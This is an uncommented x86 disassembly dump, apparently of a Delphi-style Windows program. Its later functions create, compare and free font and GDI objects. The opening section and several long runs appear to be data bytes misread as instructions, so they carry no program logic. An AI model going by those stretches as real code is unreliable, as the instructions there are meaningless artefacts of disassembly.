inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax - 0x77 ] bl
inc edx
add [ ecx + ecx * 4 + 0x540c0042 ] dh
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
imul bp [ ebp - 0x75 ] 0x1cc0
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
mov eax eax
sbb al 0x36
inc edx
add ah bl
jpo r-xdata
inc eax
add al bh
cmp [ edx ] eax
add [ eax ] eax
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edi + 0x42 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cwde
cmp [ edx ] al
xor al 0x0
add [ eax ] al
xchg esp eax
xor al [ edx ]
cwde
dec eax
inc eax
add ah ah
lahf
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ edi + ebp * 4 ] bl
inc edx
add [ edi + ebx * 4 ] ah
inc ecx
add [ ebp + ebp * 2 + 0x42 ] bl
add [ edi + ebp * 4 + 0x42 ] cl
add [ eax + 0x41 ] dh
add ah ch
insb
inc edx
add [ edi + ebp * 4 + 0x6da80042 ] ch
inc edx
add al dh
scasd [ edi ]
inc edx
add [ eax + esi * 4 ] bl
inc edx
add ah dh
outsb
inc edx
add al bh
outsb
inc edx
add [ eax ] dh
mov al 0x42
add [ eax + 0x3000426f ] al
mov bl 0x42
add ah ah
outsd
inc edx
add [ eax - 0x4d ] ch
inc edx
add [ ebx + esi * 4 + 0x42 ] ch
add [ eax + esi * 2 ] dl
inc edx
add al cl
scasb [ edi ]
inc edx
add [ eax ] al
outsd
inc edx
add [ edi + ebp * 2 - 0x4e8fffbe ] cl
inc edx
add [ ebx + esi * 4 - 0x4c53ffbe ] al
inc edx
add al al
mov bl 0x42
add [ eax - 0x4d ] cl
inc edx
add [ 0x6f634954 ] al
outsb
mov eax eax
movsb [ edi ] [ esi ]
cmp [ edx ] al
pop es
add eax 0x6f634954
outsb
xor [ eax ] bh
inc edx
add [ ebx + esi + 0x42 ] bl
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
imul esp [ ebx + 0x73 ] 0xc08b0000
aam 0x37
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
aaa
inc edx
add [ eax ] bl
add [ eax ] al
add [ eax - 0x67ffbdcc ] bl
dec eax
inc eax
add [ eax + ecx * 2 + 0x48a80040 ] ah
inc eax
add [ eax + ecx * 2 + 0x48a00040 ] ch
inc eax
add al ch
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ eax - 0x4fffbd52 ] al
scasb [ edi ]
inc edx
add [ edx ] cl
push esp
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
pop eax
mov [ edx ] eax
mov ah 0x89
inc edx
add [ esp + edx * 2 ] cl
imul bp [ ebp - 0x5c ] 0x4235
add [ ebx + esi + 0x42 ] bl
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc edx
add [ eax + 0x6000427e ] bl
jpo r-xdata
add [ edi + edi * 2 + 0x42 ] bh
add ah ah
outsd
inc edx
add [ eax - 0x80 ] ch
inc edx
add [ eax + eax * 4 + 0x42 ] ch
add ah al
add [ edx ] sub_427868
add [ edi + 0x42 ] ch
call [ esp + edi + 0x42 ]
add [ eax ] dl
push esp
push edx
jae r-xdata
imul esp [ ebx + 0x73 ] 0xc0850000
je r-xdata
lea eax [ bx + si ]
call sub_4278d7
popad
jo r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
jne r-xdata
retn
cmp eax [ rw-data ]
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x37 ] ch
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi + 0x42 ] bl
add [ eax + eax ] bh
add [ eax ] al
xchg esp eax
xor al [ edx ]
cwde
dec eax
inc eax
add ah ah
lahf
inc ecx
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add [ esp + edx * 4 + 0x42 ] al
add [ edi + ebx * 4 ] ah
inc ecx
add [ ebp + ebp * 2 + 0x42 ] bl
add [ eax + 0x74004294 ] al
mov al [ 0xffffffff96600041 ]
inc edx
add al ah
xchg esi eax
inc edx
add [ eax - 0x6bffbd93 ] ch
cdq
inc edx
add [ eax - 0x66 ] cl
inc edx
add [ eax - 0x7ffbd66 ] cl
outsb
inc edx
add al dl
fwait
inc edx
add [ edi + ebx * 4 - 0x583bffbe ] bh
inc edx
add [ eax + ebp * 4 + 0x42 ] bl
add [ eax + esi * 2 ] al
inc edx
add [ eax - 0x4bffbd56 ] bl
stosb [ edi ]
inc edx
add ah bl
xchg ebx eax
inc edx
add [ eax ] al
outsd
inc edx
add [ edi + ebp * 2 - 0x6167ffbe ] cl
inc edx
add [ ebp + ebp * 4 + 0x42 ] dh
add [ esi + ebx * 4 ] dl
inc edx
add [ ebp + ebp * 4 + 0x42 ] bh
add [ esi + ebp * 4 ] bl
inc edx
add al bh
cdq
inc edx
add [ eax - 0x66 ] bl
inc edx
add [ eax + 0x70042a6 ] cl
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42376870
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x4236e870
add [ ebx + esi + 0x42 ] bl
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi + 0x740042 ] cl
add [ eax ] al
cwde
xor al 0x42
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
imul esp [ ebx + 0x73 ] 0x36880000
inc edx
dec ebp
ror [ ecx + 0x31c289d1 ] 0xc0
popad
jb r-xdata
popad
outsb
popad
jb r-xdata
arpl [ ebp + 0x4d ] sp
push eax
call DeleteObject
cdq
dec ecx
add [ esi + eax + 0x50 ] dh
inc eax
add [ eax + 0x4239 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6fffbdc7 ] cl
cmp [ edx ] eax
and al 0x0
add [ eax ] al
aam 0x38
inc edx
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add al bh
cmp [ edx ] eax
add [ eax ] eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_42398b
inc esp
cmp al 0x42
add [ 0x75724254 ] dl
jae r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
push edx
jae r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
jne r-xdata
pop es
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
dec ebp
popad
outsb
popad
jb r-xdata
ror [ ecx + 0x31c289d1 ] 0xc0
cdq
dec ecx
add [ esi + eax + 0x50 ] dh
call DeleteObject
retn
inc eax
add [ eax + 0x4239 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x6fffbdc7 ] cl
cmp [ edx ] eax
and al 0x0
add [ eax ] al
aam 0x38
inc edx
add [ eax - 0x5bffbfb8 ] bl
dec eax
inc eax
add [ eax - 0x53ffbfb8 ] ch
dec eax
inc eax
add [ eax - 0x17ffbfb8 ] ah
inc ebp
inc eax
add [ esi + eax * 2 ] al
inc eax
add al bh
cmp [ edx ] eax
add [ eax ] eax
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
jne r-xdata
retn
sub_4239bc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_4239f8
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_423a34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_4239a8
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_423a1c
xor edx edx
push ebp
push sub_423b08
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423b0f
mov eax [ ebp - 0x4 ]
call sub_423a28
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_402f00
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
lea edx [ eax + 0x10 ]
mov eax ebx
call sub_4030fc
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
movzx ecx [ eax + 0x20 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
add eax 0x10
call sub_409954
test al al
je r-xdata
sub_423b18
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
call sub_423a1c
xor ecx ecx
push ebp
push sub_423ba0
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x10 ]
dec [ eax + 0x4 ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x4 ] 0x0
sete [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_423a28
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov edx [ eax ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
mov eax edx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov [ eax ] edx
sub_423bdc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423a1c
xor eax eax
push ebp
push sub_423c45
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_423a34
mov esi eax
mov [ ebx + 0x10 ] esi
cmp edi esi
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_423b18
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423c4c
mov eax [ ebp - 0x4 ]
call sub_423a28
retn
mov eax ebx
mov si 0xfffd
call sub_40484c
sub_423c58
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423a1c
xor eax eax
push ebp
push sub_423cb4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ esi + 0x10 ]
cmp edi ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423cbb
mov eax [ ebp - 0x4 ]
call sub_423a28
retn
inc [ edi + 0x4 ]
mov [ esi + 0x10 ] edi
mov eax esi
mov si 0xfffd
call sub_40484c
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_423b18
sub_423cd4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423a1c
xor eax eax
push ebp
push sub_423d34
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423d3b
mov eax [ ebp - 0x4 ]
call sub_423a28
retn
mov esi ebx
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
cmp [ esi + 0x14 ] 0x0
jge r-xdata
push edi
call DeleteObject
xor eax eax
mov [ esi + 0x8 ] eax
sub_423d44
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
call sub_419c08
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_423de1
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_419898
mov ebx eax
mov eax ebx
call sub_4253d0
inc [ ebp - 0x4 ]
mov eax ebx
call sub_425738
mov eax [ rw-data ]
call sub_423cd4
mov eax [ rw-data ]
call sub_423cd4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423de8
mov ebx [ ebp - 0x4 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
call sub_419c6c
retn
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_419898
call sub_425608
inc esi
dec ebx
jne r-xdata
sub_424437
dec [ ebx ]
add [ eax ] al
add [ edi + 0x45 ] cl
dec ebp
pop edi
inc ebx
dec eax
inc ecx
push edx
push ebx
inc ebp
push esp
add [ edx + 0x11 ] ch
mov ecx rw-data
call sub_419348
retn
sub_424468
push ebx
push esi
push edi
add esp 0xffffffa0
mov ebx edx
mov esi eax
push esi
mov edi ebx
mov esi rw-data
mov ecx 0xc
[ edi ] [ esi ]
pop esi
test esi esi
je r-xdata
add esp 0x60
pop edi
pop esi
pop ebx
retn
push esp
push 0x3c
push esi
call GetObjectA
test eax eax
je r-xdata
mov eax [ esp ]
mov [ ebx + 0x4 ] eax
cmp [ esp + 0x10 ] 0x2bc
jl r-xdata
cmp [ esp + 0x14 ] 0x1
jne r-xdata
or [ ebx + 0xd ] 0x1
cmp [ esp + 0x15 ] 0x1
jne r-xdata
or [ ebx + 0xd ] 0x2
cmp [ esp + 0x16 ] 0x1
jne r-xdata
or [ ebx + 0xd ] 0x4
movzx eax [ esp + 0x17 ]
mov [ ebx + 0xe ] al
lea eax [ esp + 0x3c ]
lea edx [ esp + 0x1c ]
mov ecx 0x20
call sub_404100
lea edx [ esp + 0x3c ]
lea eax [ ebx + 0xf ]
mov cl 0x1f
call sub_4039ac
movzx eax [ esp + 0x1b ]
and al 0xf
dec al
je r-xdata
or [ ebx + 0xd ] 0x8
mov [ ebx + 0xc ] 0x2
jmp r-xdata
dec al
jne r-xdata
mov [ ebx ] esi
mov eax [ esp + 0xc ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] 0x0
mov [ ebx + 0xc ] 0x1
jmp r-xdata
sub_424528
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423a34
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0xff000008
mov eax [ rw-data ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_42457c
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_423b18
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_4245c0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_419e40
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424274
xor eax eax
push ebp
push sub_42467b
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_424274
xor eax eax
push ebp
push sub_42465e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423c58
mov edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4246fc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp eax [ ebx + 0x1c ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424665
mov eax [ ebp - 0x8 ]
call sub_424284
retn
mov eax ebx
call sub_424a40
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_424a5c
sub_4246ac
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_424274
xor eax eax
push ebp
push sub_4246f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423bdc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4246f8
mov eax [ ebp - 0x4 ]
call sub_424284
retn
sub_424710
push ebx
mov ebx eax
movzx eax [ ebx + 0xe ]
cmp al [ rw-data ]
jne r-xdata
xor eax eax
pop ebx
retn
mov eax rw-data
lea edx [ ebx + 0xf ]
movzx ecx [ eax ]
inc ecx
call sub_403a4c
je r-xdata
mov al 0x1
pop ebx
retn
sub_42473c
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x48 ] edx
mov [ ebp - 0x44 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_424958
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42495f
lea eax [ ebp - 0x50 ]
mov edx 0x4
call sub_405554
retn
mov eax [ rw-data ]
call sub_423a1c
xor edx edx
push ebp
push sub_424930
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_423a28
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1d ] 0x1
je r-xdata
mov [ ebp - 0x30 ] 0x190
mov [ ebp - 0x30 ] 0x2bc
jmp r-xdata
mov [ ebp - 0x29 ] al
cmp [ rw-data ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1d ] 0x2
setne al
mov [ ebp - 0x2c ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x1d ] 0x4
setne al
mov [ ebp - 0x2b ] al
mov eax [ ebp - 0x4 ]
test [ eax + 0x1d ] 0x8
setne al
mov [ ebp - 0x2a ] al
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x1e ]
cmp al 0x1
jne r-xdata
mov edi r-xdata
test edi edi
je r-xdata
sub esi 0x4
mov esi [ esi ]
movzx eax [ rw-data ]
mov [ ebp - 0x29 ] al
jmp r-xdata
push edi
mov eax r-xdata
call sub_4059dc
push eax
push esi
lea eax [ ebp - 0x48 ]
mov edx [ ebp - 0x4 ]
add edx 0x1f
call sub_405794
mov eax [ ebp - 0x48 ]
call sub_4059dc
push eax
push 0x1
push 0x400
call CompareStringA
sub eax 0x2
test eax eax
jne r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x44 ]
mov edx [ ebp - 0x4 ]
add edx 0x1f
call sub_405794
mov esi [ ebp - 0x44 ]
test esi esi
je r-xdata
lea eax [ ebp - 0x50 ]
mov edx [ ebp - 0x4 ]
add edx 0x1f
call sub_405794
mov edx [ ebp - 0x50 ]
lea eax [ ebp - 0x24 ]
call sub_40a928
lea eax [ ebp - 0x4c ]
mov edx rw-data
call sub_405794
mov edx [ ebp - 0x4c ]
lea eax [ ebp - 0x24 ]
call sub_40a928
jmp r-xdata
mov [ ebp - 0x26 ] 0x0
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call sub_42b438
cmp al 0x80
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x28 ] 0x7
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x10
call sub_424710
test al al
je r-xdata
mov [ ebp - 0x25 ] 0x2
jmp r-xdata
dec al
je r-xdata
mov [ ebp - 0x27 ] 0x0
mov eax ebx
call sub_424ab4
dec al
je r-xdata
mov [ ebp - 0x29 ] 0x80
lea eax [ ebp - 0x40 ]
push eax
call CreateFontIndirectA
mov edx [ ebp - 0x4 ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x25 ] 0x1
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x25 ] 0x0
sub_424978
push ebx
push esi
add esp 0xffffffd0
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_424468
mov edx esp
mov eax ebx
call sub_4246ac
add esp 0x30
pop esi
pop ebx
retn
sub_4249a4
push ebx
push esi
add esp 0xffffffd0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424694
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_4246ac
add esp 0x30
pop esi
pop ebx
retn
sub_4249e4
push ebx
push esi
add esp 0xfffffed0
mov esi edx
mov ebx eax
test esi esi
je r-xdata
add esp 0x130
pop esi
pop ebx
retn
mov edx esp
mov eax ebx
call sub_424694
lea eax [ esp + 0xf ]
xor ecx ecx
mov edx 0x20
call sub_403af4
lea eax [ esp + 0x30 ]
mov edx esi
mov ecx 0xff
call sub_4057e8
lea edx [ esp + 0x30 ]
lea eax [ esp + 0xf ]
mov cl 0x1f
call sub_4039ac
mov edx esp
mov eax ebx
call sub_4246ac
sub_424a5c
push ebx
push esi
mov esi edx
mov ebx eax
push 0x48
mov eax [ ebx + 0x1c ]
push eax
push esi
call MulDiv
mov edx eax
neg edx
mov eax ebx
call sub_4249a4
pop esi
pop ebx
retn
sub_424a88
push ebx
add esp 0xffffffcc
mov [ esp ] dl
mov ebx eax
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_424694
movzx eax [ esp ]
mov [ esp + 0x11 ] al
lea edx [ esp + 0x4 ]
mov eax ebx
call sub_4246ac
add esp 0x34
pop ebx
retn
sub_424abc
push ebx
push esi
add esp 0xffffffd0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424694
mov [ esp + 0xc ] bl
mov edx esp
mov eax esi
call sub_4246ac
add esp 0x30
pop esi
pop ebx
retn
sub_424aec
push ebx
push esi
add esp 0xffffffd0
mov ebx edx
mov esi eax
mov edx esp
mov eax esi
call sub_424694
mov [ esp + 0xe ] bl
mov edx esp
mov eax esi
call sub_4246ac
add esp 0x30
pop esi
pop ebx
retn
sub_424b1c
push ebx
push esi
add esp 0xffffffd0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424694
mov [ esp + 0x8 ] esi
mov edx esp
mov eax ebx
call sub_4246ac
add esp 0x30
pop esi
pop ebx
retn
sub_424b44
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov edx rw-data
mov eax [ rw-data ]
call sub_423a34
mov [ esi + 0x10 ] eax
mov [ esi + 0x18 ] 0x4
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404974
mov eax esi
pop esi
pop ebx
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_424b88
push ebx
push esi
call sub_404a1c
mov ebx edx
mov esi eax
mov edx [ esi + 0x10 ]
mov eax [ rw-data ]
call sub_423b18
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4049c4
sub_424bb0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_419e40
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424274
xor eax eax
push ebp
push sub_424c50
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax ebx
call sub_424274
xor eax eax
push ebp
push sub_424c33
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx [ ebx + 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423c58
movzx edx [ ebx + 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_424d98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424c3a
mov eax [ ebp - 0x8 ]
call sub_424284
retn
sub_424c68
push esi
push edi
mov eax [ eax + 0x10 ]
lea esi [ eax + 0x10 ]
mov edi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
xor eax eax
mov [ edx ] eax
pop edi
pop esi
retn
sub_424c80
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_424274
xor eax eax
push ebp
push sub_424cc5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_423bdc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424ccc
mov eax [ ebp - 0x4 ]
call sub_424284
retn
sub_424cd8
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
call sub_424c68
mov [ esp + 0x4 ] esi
mov edx esp
mov eax ebx
call sub_424c80
add esp 0x10
pop esi
pop ebx
retn
sub_424d00
push ebp
mov ebp esp
add esp 0xffffffec
mov eax [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
